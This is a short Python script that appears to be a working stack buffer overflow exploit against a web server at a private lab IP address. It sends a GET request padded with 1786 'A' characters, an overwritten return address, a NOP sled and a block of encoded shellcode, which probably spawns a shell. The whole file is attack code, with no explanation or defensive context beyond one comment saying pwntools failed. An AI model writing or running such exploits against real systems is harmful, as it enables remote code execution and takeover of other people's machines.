import socket,sys
#pwntools didnt work, not sure why

ip = "192.168.15.172"
port = 80

shellcode = ("\xb8\x3b\x44\xbb\xd2\xda\xc4\xd9\x74\x24\xf4"
"\x5d\x31\xc9\xb1\x52\x83\xed\xfc\x31\x45\x0e"
"\x03\x7e\x4a\x59\x27\x7c\xba\x1f\xc8\x7c\x3b"
"\x40\x40\x99\x0a\x40\x36\xea\x3d\x70\x3c\xbe"
"\xb1\xfb\x10\x2a\x41\x89\xbc\x5d\xe2\x24\x9b"
"\x50\xf3\x15\xdf\xf3\x77\x64\x0c\xd3\x46\xa7"
"\x41\x12\x8e\xda\xa8\x46\x47\x90\x1f\x76\xec"
"\xec\xa3\xfd\xbe\xe1\xa3\xe2\x77\x03\x85\xb5"
"\x0c\x5a\x05\x34\xc0\xd6\x0c\x2e\x05\xd2\xc7"
"\xc5\xfd\xa8\xd9\x0f\xcc\x51\x75\x6e\xe0\xa3"
"\x87\xb7\xc7\x5b\xf2\xc1\x3b\xe1\x05\x16\x41"
"\x3d\x83\x8c\xe1\xb6\x33\x68\x13\x1a\xa5\xfb"
"\x1f\xd7\xa1\xa3\x03\xe6\x66\xd8\x38\x63\x89"
"\x0e\xc9\x37\xae\x8a\x91\xec\xcf\x8b\x7f\x42"
"\xef\xcb\xdf\x3b\x55\x80\xf2\x28\xe4\xcb\x9a"
"\x9d\xc5\xf3\x5a\x8a\x5e\x80\x68\x15\xf5\x0e"
"\xc1\xde\xd3\xc9\x26\xf5\xa4\x45\xd9\xf6\xd4"
"\x4c\x1e\xa2\x84\xe6\xb7\xcb\x4e\xf6\x38\x1e"
"\xc0\xa6\x96\xf1\xa1\x16\x57\xa2\x49\x7c\x58"
"\x9d\x6a\x7f\xb2\xb6\x01\x7a\x55\x79\x7d\x8b"
"\xf0\x11\x7c\x93\xeb\xbd\x09\x75\x61\x2e\x5c"
"\x2e\x1e\xd7\xc5\xa4\xbf\x18\xd0\xc1\x80\x93"
"\xd7\x36\x4e\x54\x9d\x24\x27\x94\xe8\x16\xee"
"\xab\xc6\x3e\x6c\x39\x8d\xbe\xfb\x22\x1a\xe9"
"\xac\x95\x53\x7f\x41\x8f\xcd\x9d\x98\x49\x35"
"\x25\x47\xaa\xb8\xa4\x0a\x96\x9e\xb6\xd2\x17"
"\x9b\xe2\x8a\x41\x75\x5c\x6d\x38\x37\x36\x27"
"\x97\x91\xde\xbe\xdb\x21\x98\xbe\x31\xd4\x44"
"\x0e\xec\xa1\x7b\xbf\x78\x26\x04\xdd\x18\xc9"
"\xdf\x65\x38\x28\xf5\x93\xd1\xf5\x9c\x19\xbc"
"\x05\x4b\x5d\xb9\x85\x79\x1e\x3e\x95\x08\x1b"
"\x7a\x11\xe1\x51\x13\xf4\x05\xc5\x14\xdd")


buffer = "GET /"
buffer += "A"*1786
buffer += "\x43\xb8\xb1\x74" #0x74b1b843
buffer += "\x90"*20
buffer += shellcode
buffer += " HTTP/1.1\r\n\r\n"


print(buffer)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(buffer)
s.close()